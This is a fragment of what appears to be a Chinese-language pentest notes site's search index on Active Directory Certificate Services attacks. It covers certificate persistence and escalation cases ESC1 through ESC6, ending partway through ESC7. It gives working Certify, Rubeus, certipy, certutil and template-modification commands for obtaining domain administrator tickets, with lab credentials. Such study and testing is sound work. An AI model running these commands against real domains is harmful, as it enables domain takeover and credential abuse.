THEFT5"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#_6","text":"","title":"\u6743\u9650\u7ef4\u6301"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#active-user-credential-theft-via-certificates-persist1","text":"\u5982\u679c\u6709\u76f8\u5e94\u7684\u8bc1\u4e66\u6a21\u7248\uff0c\u4e14\u5df2\u77e5\u5f53\u524d\u7528\u6237\u5bc6\u7801\uff0c\u5219\u53ef\u4ee5\u7528\u8bc1\u4e66\u7533\u8bf7tgt\u6765\u8fbe\u5230\u6743\u9650\u7ef4\u6301\uff0c\u5373\u4f7f\u7528\u6237\u91cd\u7f6e\u5bc6\u7801\uff0c\u8be5tgt\u4e5f\u4f9d\u65e7\u6709\u6548\uff0c\u6b64\u65b9\u6cd5\u4e0d\u4f1a\u7ecf\u8fc7lsass\u53ef\u4ee5\u89c4\u907f\u4e00\u4e9bedr\u68c0\u6d4b\u3002 \u6240\u4f7f\u7528\u7684\u8bc1\u4e66\u6a21\u677f\u9700\u8981\u5177\u6709\u4ee5\u4e0b\u5c5e\u6027\uff1a \u8be5\u8bc1\u4e66\u6a21\u677f\u516c\u5f00\u6ce8\u518c\u3002 \u5141\u8bb8\u57df\u7528\u6237\uff08\u6216\u7528\u6237\u6240\u5c5e\u7684\u7ec4\uff09\u8fdb\u884c\u6ce8\u518c\u3002 \u81f3\u5c11\u5177\u6709\u4ee5\u4e0b\u4efb\u4f55\u53ef\u542f\u7528\u57df\u8eab\u4efd\u9a8c\u8bc1\u7684 EKU\uff1a Smart Card Logon (1.3.6.1.4.1.311.20.2.2) Client Authentication (1.3.6.1.5.5.7.3.2) \u25cb PKINIT Client Authentication (1.3.6.1.5.2.3.4) Any Purpose EKU (2.5.29.37.0) No EKU set. i.e., this is a (subordinate) CA certificate. \u4e0d\u9700\u8981\u8bc1\u4e66\u7ba1\u7406\u5458\u6279\u51c6\u6216 \u201c\u6388\u6743\u7b7e\u540d\u201d \u7b7e\u53d1\u8981\u6c42\u3002 \u5e78\u8fd0\u7684\u662f\uff0c\u6709\u4e00\u4e2a\u5df2\u53d1\u5e03\u7684\u6a21\u677f\u5141\u8bb8\u8fd9\u6837\u505a\uff0c\u5373 User \u6a21\u677f\u3002\u4f46\u662f\uff0c\u867d\u7136\u6b64\u6a21\u677f\u662f AD CS \u7684\u9ed8\u8ba4\u6a21\u677f\uff0c\u4f46\u67d0\u4e9b\u73af\u5883\u53ef\u80fd\u4f1a\u7981\u7528\u5b83\u3002 \u67e5\u627e\u7b26\u5408\u4e0a\u8ff0\u6761\u4ef6\u7684\u6a21\u7248 Certify.exe find /clientauth \u7533\u8bf7\u8bc1\u4e66\uff0c\u4ee5User\u6a21\u7248\u4e3a\u4f8b\uff08\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8981\u60f3\u6210\u529f\u4f7f\u7528 Certify \u7684 request \u547d\u4ee4\uff0c\u9700\u8981\u5c06 Certify \u9879\u76ee\u4e2d\u751f\u4ea7\u7684 DLL \u4f9d\u8d56 Interop.CERTENROLLLib.dll \u590d\u5236\u5230 Certify.exe \u7684\u76f8\u540c\u76ee\u5f55\u4e0b\u3002\uff09 Certify.exe request /ca:DC01.pentest.com\\pentest-DC01-CA /template:User \u6210\u529f\u6267\u884c\u540e\uff0c\u5c06\u8f93\u51fa\u8bc1\u4e66 + \u79c1\u94a5\u7684 .pem \u683c\u5f0f\u7684\u6587\u672c\u5757\uff0c\u9700\u7528openssl\u547d\u4ee4\u8f6c\u6362\u4e3a.pfx\u683c\u5f0f\uff0c\u624d\u80fd\u7ed9rubeus\u7528\u3002 \u6267\u884c\u8fd9\u4e2a\u6307\u4ee4\u540e\u4f1a\u63d0\u793a\u60a8\u8f93\u5165\u5bc6\u7801\uff0c\u4ee5\u4fdd\u62a4\u751f\u6210\u7684 .pfx \u6587\u4ef6\u3002 openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx \u901a\u8fc7rubeus\u7533\u8bf7tgt\u5e76\u6ce8\u5165\u5185\u5b58 Rubeus.exe asktgt /user:Marcus /certificate:C:\\Users\\Marcus\\cert.pfx /password:Passw0rd /ptt","title":"Active User Credential Theft via Certificates \u2013 PERSIST1"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#machine-persistence-via-certificates-persist2","text":"\u5982\u679c\u653b\u51fb\u8005\u63d0\u5347\u4e86\u6743\u9650\u5230system\uff0c\u53ef\u4ee5\u901a\u8fc7\u9ed8\u8ba4\u7684 Machine \u6a21\u677f\u4e3a\u5f53\u524d\u673a\u5668\u8d26\u6237\u6ce8\u518c\u8bc1\u4e66,\u5e76\u83b7\u53d6tgt Certify.exe request /ca:DC01.pentest.com\\pentest-DC01-CA /template:Machine /machine \u540e\u7eed\u64cd\u4f5c\u4e0e\u4e0a\u4e00\u5c0f\u8282\u4e00\u81f4\uff0c\u7528kekeo\u6ce8\u5165tgt\u5230\u5185\u5b58\u3002","title":"Machine Persistence via Certificates - PERSIST2"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#_7","text":"","title":"\u57df\u6743\u9650\u63d0\u5347"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#misconfigured-certificate-templates-esc1","text":"\u8bc1\u4e66\u6a21\u7248\u6709\u4e00\u7ec4\u7279\u5b9a\u7684\u8bbe\u7f6e\uff0c\u4f7f\u5b83\u4eec\u6781\u6613\u88ab\u653b\u51fb\u8005\u5229\u7528\uff0c\u4ee5\u5b9e\u73b0\u57df\u6743\u9650\u63d0\u5347\u3002\u4e0b\u9762\u6211\u4eec\u6765\u4ecb\u7ecd\u7b2c\u4e00\u79cd\u914d\u7f6e\u60c5\u51b5\uff08ESC1\uff09\uff1a \u4f01\u4e1a CA \u6388\u4e88\u4f4e\u7279\u6743\u7528\u6237\u6ce8\u518c\u6743\u9650\u3002 CA \u8bc1\u4e66\u7ba1\u7406\u7a0b\u5e8f\u6279\u51c6\u88ab\u7981\u7528\u3002 \u65e0\u9700\u6388\u6743\u7b7e\u540d\u3002 \u8fc7\u4e8e\u5bbd\u677e\u7684\u8bc1\u4e66\u6a21\u677f\u5b89\u5168\u63cf\u8ff0\u7b26\u4f1a\u5411\u4f4e\u7279\u6743\u7528\u6237\u6388\u4e88\u8bc1\u4e66\u6ce8\u518c\u6743\u9650\u3002 \u8bc1\u4e66\u6a21\u677f\u5b9a\u4e49\u4e86\u542f\u7528\u57df\u8eab\u4efd\u9a8c\u8bc1\u7684 EKU\u3002 \u8bc1\u4e66\u6a21\u677f\u5141\u8bb8\u8bf7\u6c42\u8005\u5728 CSR \u4e2d\u6307\u5b9a subjectAltName\u3002 \u6ce8\u610f\u6700\u540e\u4e00\u70b9\uff0c\u8fd9\u4e2a\u610f\u601d\u662f\u5728\u901a\u8fc7\u8bc1\u4e66\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u65f6\uff0c\u53ef\u4ee5\u6307\u5b9a\u8bf7\u6c42\u8005\u7684\u8eab\u4efd\u4e3a\u4efb\u4f55\u4eba\uff08\u4f8b\u5982\u57df\u7ba1\uff09\u3002 \u8bc1\u4e66\u6a21\u677f\u5728\u5176 AD \u5bf9\u8c61\u7684 mspki-certificate-name-flag \u5c5e\u6027\u4e2d\u6307\u5b9a\u8bf7\u6c42\u8005\u662f\u5426\u53ef\u4ee5\u5728\u5176\u4e2d\u6307\u5b9a SAN\u3002 mspki-certificate-name-flag \u5c5e\u6027\u662f\u4f4d\u63a9\u7801\uff0c\u5982\u679c\u5b58\u5728 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT \u6807\u5fd7\uff0c\u5219\u8bf7\u6c42\u8005\u53ef\u4ee5\u6307\u5b9a SAN\u3002\u5728\u8bc1\u4e66\u6a21\u677f\u63a7\u5236\u53f0 MMC \u7ba1\u7406\u5355\u5143\u4e2d\uff0c\u6b64\u503c\u5728\u6a21\u677f\u7684 \u201c\u5c5e\u6027\u201d \u7684 \u201c\u4f7f\u7528\u8005\u540d\u79f0\u201d \u9009\u9879\u5361\u4e2d\u8fdb\u884c\u8bbe\u7f6e\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u52fe\u9009 \u201c\u5728\u8bf7\u6c42\u4e2d\u63d0\u4f9b(S)\u201d \u5373\u53ef\u3002 \u4e0a\u8ff0\u8fd9\u4e9b\u914d\u7f6e\u5141\u8bb8\u4f4e\u6743\u9650\u7528\u6237\u4f7f\u7528\u4efb\u610f\u7684 SAN \u8bf7\u6c42\u8bc1\u4e66\uff0c\u5bfc\u81f4\u4f4e\u6743\u9650\u7528\u6237\u80fd\u591f\u901a\u8fc7 Kerberos \u6216 SChannel \u4ee5\u57df\u4e2d\u7684\u4efb\u4f55\u4e3b\u4f53\u8eab\u4efd\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002 \u679a\u4e3e\u5b58\u5728\u5371\u9669\u7684\u8bc1\u4e66\u6a21\u7248 Certify.exe find /vulnerable \u5982\u4e0a\u56fe\u6240\u793a\uff0c\u8bc1\u4e66\u6a21\u677f VulnTemplate \u5728 msPKI-Certificate-Name-Flag \u5c5e\u6027\u4e2d\u542f\u7528\u4e86 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT \u6807\u5fd7 \u5e76\u4e14\u5177\u6709\u5ba2\u6237\u7aef\u8eab\u4efd\u9a8c\u8bc1\u7684 EKU\uff08Extended Key Usage,\u6269\u5c55\u5bc6\u94a5\u7528\u9014\uff09\uff0cpkiextendedkeyuseage\u5b58\u5728\u5ba2\u6237\u7aef\u8eab\u4efd\u9a8c\u8bc1 \u5e76\u6388\u4e88\u6240\u6709\u57df\u7528\u6237\u6ce8\u518c\u6743\u9650\u3002(enrollment rights\u5b58\u5728 domain users\uff09 \u901a\u8fc7certify\u8bf7\u6c42tgt Certify.exe request /ca:DC01.pentest.com\\pentest-DC01-CA /template:VulnTemplate /altname:PENTEST\\Administrator \u8f6c\u4e3a.pfx\u540e\u7ed9rubeus\u5229\u7528\u3002 Rubeus.exe asktgt /user:Administrator /certificate:C:\\Users\\Marcus\\cert.pfx /password:Passw0rd /ptt","title":"Misconfigured Certificate Templates - ESC1"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#misconfigured-certificate-templates-esc2","text":"\u662fesc1\u7684\u53d8\u4f53 \u4f01\u4e1a CA \u6388\u4e88\u4f4e\u7279\u6743\u7528\u6237\u6ce8\u518c\u6743\u9650\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 CA \u8bc1\u4e66\u7ba1\u7406\u7a0b\u5e8f\u6279\u51c6\u88ab\u7981\u7528\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 \u65e0\u9700\u6388\u6743\u7b7e\u540d\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 \u8fc7\u4e8e\u5bbd\u677e\u7684\u8bc1\u4e66\u6a21\u677f\u5b89\u5168\u63cf\u8ff0\u7b26\u4f1a\u5411\u4f4e\u7279\u6743\u7528\u6237\u6388\u4e88\u8bc1\u4e66\u6ce8\u518c\u6743\u9650\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 \u8bc1\u4e66\u6a21\u677f\u5b9a\u4e49\u4e86 Any Purpose \u7c7b\u578b\u7684 EKU \u6216 SubCA \u7c7b\u578b\u7684 EKU\u3002\u524d\u8005 Any Purpose \u6307\u8bc1\u4e66\u53ef\u4ee5\u7528\u4e8e\u4efb\u4f55\u76ee\u7684\uff0c\u540e\u8005 SubCA \u6307\u8bc1\u4e66\u6ca1\u6709 EKU\uff0c\u76f8\u5f53\u4e8e\u4ece\u5c5e CA \u7684\u8bc1\u4e66\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u5177\u6709 Any Purpose EKU \u7684\u8bc1\u4e66\u7528\u4e8e\u4efb\u4f55\u76ee\u7684\uff0c\u8fd9\u5305\u62ec\u5ba2\u6237\u7aef\u8eab\u4efd\u9a8c\u8bc1\u3001\u670d\u52a1\u5668\u8eab\u4efd\u9a8c\u8bc1\u3001\u4ee3\u7801\u7b7e\u540d\u7b49\u3002\u53ef\u4ee5\u7528\u4e8e\u83b7\u53d6tgt\u8fdb\u884c\u6301\u4e45\u5316\u7b49\u64cd\u4f5c\uff0c\u611f\u89c9\u5371\u5bb3\u5ea6\u6ca1esc1\u9ad8 Certify.exe find /vulnerable","title":"Misconfigured Certificate Templates - ESC2"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#misconfigured-enrollment-agent-templates-esc3","text":"\u6ee5\u7528eku\u4e2d\u7684\u201c\u6ce8\u518c\u4ee3\u7406\u201d \u5bfc\u81f4\u7684\u6743\u9650\u63d0\u5347\u3002 \u6ce8\u518c\u4ee3\u7406\uff1a\u5141\u8bb8\u59d4\u6258\u4eba\u4ee3\u8868\u53e6\u4e00\u4e2a\u7528\u6237\u6ce8\u518c\u8bc1\u4e66\u3002 \u5b8c\u6210\u6b64\u653b\u51fb\uff0cCA \u9700\u8981\u81f3\u5c11\u4ee5\u4e0b\u4e24\u7ec4\u5339\u914d\u6761\u4ef6\u7684\u8bc1\u4e66\u6a21\u677f\uff1a \u6761\u4ef61: \u5141\u8bb8\u4f4e\u6743\u9650\u7528\u6237\u6ce8\u518c\u4ee3\u7406\u8bc1\u4e66\u3002 \u4f01\u4e1a CA \u6388\u4e88\u4f4e\u7279\u6743\u7528\u6237\u6ce8\u518c\u6743\u9650\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 CA \u8bc1\u4e66\u7ba1\u7406\u7a0b\u5e8f\u6279\u51c6\u88ab\u7981\u7528\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 \u65e0\u9700\u6388\u6743\u7b7e\u540d\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 \u8fc7\u4e8e\u5bbd\u677e\u7684\u8bc1\u4e66\u6a21\u677f\u5b89\u5168\u63cf\u8ff0\u7b26\u4f1a\u5411\u4f4e\u7279\u6743\u7528\u6237\u6388\u4e88\u8bc1\u4e66\u6ce8\u518c\u6743\u9650\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 \u8bc1\u4e66\u6a21\u677f\u5b9a\u4e49\u4e86\u8bc1\u4e66\u7533\u8bf7\u4ee3\u7406 EKU\u3002\u8bc1\u4e66\u7533\u8bf7\u4ee3\u7406 OID\uff081.3.6.1.4.1.311.20.2.1\uff09\u5141\u8bb8\u4ee3\u8868\u5176\u4ed6\u4e3b\u4f53\u8bf7\u6c42\u5176\u4ed6\u8bc1\u4e66\u6a21\u677f\u3002 \u6761\u4ef6 2\uff1a \u53e6\u4e00\u4e2a\u6a21\u677f\u9700\u8981\u5141\u8bb8\u4f4e\u6743\u9650\u7528\u6237\u4f7f\u7528\u6ce8\u518c\u4ee3\u7406\u8bc1\u4e66\u4ee3\u8868\u53e6\u4e00\u4e2a\u7528\u6237\u6765\u8bf7\u6c42\u8bc1\u4e66\uff0c\u5e76\u4e14\u8be5\u6a21\u677f\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5141\u8bb8\u57df\u8eab\u4efd\u9a8c\u8bc1\u7684 EKU\u3002 \u4f01\u4e1a CA \u6388\u4e88\u4f4e\u7279\u6743\u7528\u6237\u6ce8\u518c\u6743\u9650\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 CA \u8bc1\u4e66\u7ba1\u7406\u7a0b\u5e8f\u6279\u51c6\u88ab\u7981\u7528\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 \u6a21\u677f\u67b6\u6784\u7248\u672c 1 \u6216\u5927\u4e8e 2 \u5e76\u5728\u53d1\u5e03\u8981\u6c42\u4e2d\u6307\u5b9a\u4e86\u9700\u8981\u8bc1\u4e66\u7533\u8bf7\u4ee3\u7406 EKU \u7684\u5e94\u7528\u7a0b\u5e8f\u7b56\u7565\u3002\u5173\u4e8e\u53d1\u5e03\u8981\u6c42\u7684\u7ec6\u8282\u53ef\u4ee5\u53c2\u8003\u524d\u6587\u3002 \u8bc1\u4e66\u6a21\u677f\u5b9a\u4e49\u4e86\u542f\u7528\u57df\u8eab\u4efd\u9a8c\u8bc1\u7684 EKU\u3002 \u6ce8\u518c\u4ee3\u7406\u9650\u5236\u672a\u5728 CA \u4e0a\u5b9e\u65bd\u3002 \u4ee5\u4e0b\u662f\u5339\u914d\u6761\u4ef6 1 \u7684\u6a21\u677f\u7684\u793a\u4f8b\uff1a \u4ee5\u4e0b\u662f\u5339\u914d\u6761\u4ef6 2 \u7684\u6a21\u677f\u7684\u793a\u4f8b\uff1a \u5148\u8bf7\u6c42\u6ce8\u518c\u4ee3\u7406\u8bc1\u4e66\uff08\u6761\u4ef61\u6a21\u7248\uff09 Certify.exe request /ca:DC01.pentest.com\\pentest-DC01-CA /template:Vuln-EnrollmentAgent \u5c06\u5f97\u5230\u7684\u6ce8\u518c\u4ee3\u7406\u8bc1\u4e66\u4f7f\u7528 openssl \u8f6c\u6362\u4e3a .pfx \u683c\u5f0f\uff0c\u7136\u540e\uff0c\u7528\u5b83\u6765\u4ee3\u8868\u53e6\u4e00\u4e2a\u7528\u6237\uff08\u4f8b\u5982\u57df\u7ba1\u7406\u5458\u7528\u6237\uff09\u5411\u5141\u8bb8\u57df\u8eab\u4efd\u9a8c\u8bc1\u7684\u6a21\u677f\u53d1\u51fa\u8bc1\u4e66\u6ce8\u518c\u8bf7\u6c42\uff0c\u76f8\u5173\u547d\u4ee4\u5982\u4e0b\u3002 Certify.exe request /ca:DC01.pentest.com\\pentest-DC01-CA /template:Vuln-EnrollmentAgent-AuthorizedSignatures /onbehalfof:PENTEST\\Administrator /enrollcert:Vuln-EnrollmentAgentCert.pfx /enrollcertpw:Passw0rd \u5982\u4e0a\u56fe\u6240\u793a\uff0c\u6210\u529f\u4e3a\u57df\u7ba1\u7406\u5458\u7528\u6237 Administrator \u6ce8\u518c\u4e86\u4e00\u4e2a\u8bc1\u4e66\u3002\u5728\u4f7f\u7528 openssl \u8f6c\u6362\u4e3a .pfx \u683c\u5f0f\u540e\uff0c\u8fd9\u4e2a\u8bc1\u4e66\u5141\u8bb8\u6211\u4eec\u901a\u8fc7\u4ee5 Administrator \u7684\u8eab\u4efd\u8bf7\u6c42\u4e00\u4e2a TGT Rubeus.exe asktgt /user:Administrator /certificate:C:\\Users\\Marcus\\cert.pfx /password:Passw0rd /ptt","title":"Misconfigured Enrollment Agent Templates - ESC3"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#vulnerable-certificate-template-access-control-esc4","text":"\u5982\u679c\u7528\u6237\u5bf9ca\u6a21\u7248\u6709\u9ad8\u6743\u9650acl\uff0c\u5c31\u53ef\u4ee5\u5e72\u5f88\u591a\u574f\u4e8b\u3002 \u4f8b\u5b50\uff1a\u5982\u679c\u653b\u51fb\u8005\u5bf9\u6a21\u677f\u5bf9\u8c61\u62e5\u6709 WriteProperty \u6743\u9650\uff0c\u5219\u5176\u53ef\u4ee5\u4fee\u6539\u6a21\u677f AD \u5bf9\u8c61\u5c5e\u6027\uff0c\u5219\u4ed6\u4eec\u53ef\u4ee5\u76f4\u63a5\u5c06\u9519\u8bef\u914d\u7f6e\u63a8\u9001\u5230\u4e0d\u6613\u53d7\u653b\u51fb\u7684\u6a21\u677f\uff0c\u4f8b\u5982\u901a\u8fc7\u4e3a\u5141\u8bb8\u57df\u8eab\u4efd\u9a8c\u8bc1\u7684\u6a21\u677f\u5728 mspki-certificate-name-flag \u5c5e\u6027\u4e2d\u542f\u7528 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT \u6807\u5fd7\uff0c\u8fd9\u4f1a\u5bfc\u81f4\u4e0e \u201cMisconfigured Certificate Templates - ESC1\u201d \u76f8\u540c\u7684\u6ee5\u7528\u573a\u666f\u3002 Certify \u7684 find \u547d\u4ee4\u4f1a\u679a\u4e3e\u6240\u6709\u8bc1\u4e66\u6a21\u677f\u7684\u8bbf\u95ee\u63a7\u5236\u6761\u76ee\uff08BloodHound \u56e2\u961f\u4e5f\u5728\u79ef\u6781\u96c6\u6210\u6b64\u7c7b\u679a\u4e3e\uff09\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002 Certify.exe find \u53ef\u89c1\u6a21\u7248\u5c5e\u6027\u53ef\u88ab\u4fee\u6539 \u770b\u770b\u5177\u4f53\u53ef\u4ee5\u4fee\u6539\u54ea\u4e9b\u6761\u76ee Import-Module ActiveDirectory (Get-Acl -Path \"AD:CN=user,CN=certificate templates,CN=public key services,CN=services,CN=configuration,DC=ez,DC=lab\").Access objectType\u663e\u793a\u7684\u662f\u53ef\u4ee5\u4fee\u6539\u7684\u5c5e\u6027\u3002\u5982\u679c\u662fmsPKI-Certificate-Name-Flag\u7684guid\u5c31\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4e86. \u5982\u679cobjectType\u5168\u662f0\uff0c\u5219\u8868\u793a\u4efb\u610f\u5c5e\u6027\u5747\u53ef\u4fee\u6539\u3002 \u6dfb\u52a0esc1\u4e2d\u7684\u654f\u611f\u6761\u76ee\uff1a https://github.com/ly4k/Certipy certify python\u7248+\u5f3a\u5316\u7248 #\u4fdd\u7559\u65e7ESC4\u6a21\u677f\u914d\u7f6e\u5e76\u4fee\u6539ESC4\u6a21\u677f certipy template -u hack@lhc.local -p 123@Qwe -template ESC4_1 -save-old #\u5229\u7528\u65b0ESC4\u8bc1\u4e66\u6a21\u677f\u7533\u8bf7\u8bc1\u4e66 certipy req -u hack@lhc.local -p 123@Qwe -ca Lhc-CS2016-CA -target-ip 10.211.55.20 -template ESC4_1 -upn administrator@lhc.local #\u8eab\u4efd\u9a8c\u8bc1 certipy auth -pfx administrator.pfx -dc-ip 10.211.55.18 #\u6a21\u677f\u590d\u539f certipy template -u hack@lhc.local -p 123@Qwe -template ESC4 -configuration ESC4.json \u6216\u8005 https://github.com/fortalice/modifyCertTemplate \u8fd9\u4e2a\u5de5\u5177\u8fd8\u53ef\u4ee5\u67e5\u770b\u6a21\u7248\u7684\u5c5e\u6027\u4ee5\u53caacl\uff0c\u6bd4\u8f83\u7efc\u5408 python3 modifyCertTemplate.py -template KerberosAuthentication -add enrollee_supplies_subject -property msPKI-Certificate-Name-Flag ez.lab/administrator:pass \u7136\u540e\u53c2\u7167esc1\u8fdb\u884c\u653b\u51fb\u5373\u53ef\u3002","title":"Vulnerable Certificate Template Access Control - ESC4"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#ca-editf_attributesubjectaltname2-esc6","text":"EDITF_ATTRIBUTESUBJECTALTNAME2 \u7684\u6ee5\u7528\u6765\u542f\u7528 SAN (\u4e3b\u9898\u5907\u7528\u540d)\uff0c\u4ece\u800c\u5141\u8bb8\u7528\u6237\u5728\u7533\u8bf7\u8bc1\u4e66\u65f6\u8bf4\u660e\u81ea\u5df1\u8eab\u4efd\uff0c\u4ece\u800c\u8fbe\u5230\u4e0e\u542f\u7528 \u201cMisconfigured Certificate Templates - ESC1\u201d \u4e2d\u6240\u8ff0\u7684\u5371\u5bb3\u4e00\u6837 \u4e0eEDITF_ATTRIBUTESUBJECTALTNAME2 \u6709\u5173,\u5f00\u542f\u547d\u4ee4 #\u5f00\u542fEDITF_ATTRIBUTESUBJECTALTNAME2 certutil -setreg policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2 #\u91cd\u542fcertsvc\u670d\u52a1 net stop certsvc net start certsvc \u4f01\u4e1a CA \u6388\u4e88\u4f4e\u6743\u9650\u7528\u6237\u8bf7\u6c42\u6743\u9650\uff08\u9ed8\u8ba4\uff09\uff1b \u6a21\u677f\u4e2d CA \u7ba1\u7406\u5458\u5ba1\u6279\u672a\u542f\u7528\uff08\u9ed8\u8ba4\uff09\uff1b \u6a21\u677f\u4e2d\u4e0d\u9700\u8981\u6388\u6743\u7684\u7b7e\u540d\uff08\u9ed8\u8ba4\uff09\uff1b CA+EDITF_ATTRIBUTESUBJECTALTNAME2\uff08\u4ee5\u4e0b\u4e3a\u5f00\u542f\u547d\u4ee4\uff09 Certify.exe request /ca:DC01.pentest.com\\pentest-DC01-CA /template:User /altname:PENTEST\\Administrator \u83b7\u5f97admin\u7684\u8bc1\u4e66","title":"CA EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#vulnerable-certificate-authority-access-control-esc7","text":"\u8bc1\u4e66\u9881\u53d1\u673a\u6784\u4e5f\u6709\u4e00\u4e9bacl\uff0c\u666e\u901a\u7528\u6237\u62e5\u6709\u8fd9\u4e9b\u6743\u9650\u4e5f\u80fd\u8fdb\u884c\u57df\u6743\u9650\u63d0\u5347 \u8fd9\u91cc\u7684\u4e24\u4e2a\u4e3b\u8981\u6743\u9650\u662f \u201c\u7ba1\u7406 CA\u201d\uff08ManageCA\uff09\u6743\u9650\u548c \u201c\u9881\u53d1\u548c\u7ba1\u7406\u8bc1\u4e66\u201d\uff08ManageCertificates\uff09\u6743\u9650\uff0c\u62e5\u6709\u8fd9\u4e24\u4e2a\u6743\u9650\u7684\u7528\u6237\u5206\u522b\u5bf9\u5e94\u4e8e \u201cCA \u7ba1\u7406\u5458\u201d \u548c \u201c\u8bc1\u4e66\u7ba1\u7406\u5458\u201d\uff08\u6709\u65f6\u79f0\u4e3a CA \u5b98\u5458\uff09\u3002 1.\u5bf9\u4e8e\u201c\u7ba1\u7406 CA\u201d\uff08ManageCA\uff09\u6743\u9650 Import-Module -Name PSPKI Get-CertificationAuthority -ComputerName dc01.pentest.com | Get-CertificationAuthorityAcl | select -expand Access \u5f00\u542f EDITF_ATTRIBUTESUBJECTALTNAME2 \u4f4d\u4ee5\u5141\u8bb8\u5728\u4efb\u4f55\u6a21\u677f\u6ce8\u518c\u8bf7\u6c42\u4e2d\u8bbe\u7f6e SAN\uff0c\u7528\u4e8e\u5b8c\u6210esc6\u653b\u51fb Import-Module PSPKI $ConfigReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD \"DC01.pentest.com\" $ConfigReader.SetRootNode($true) 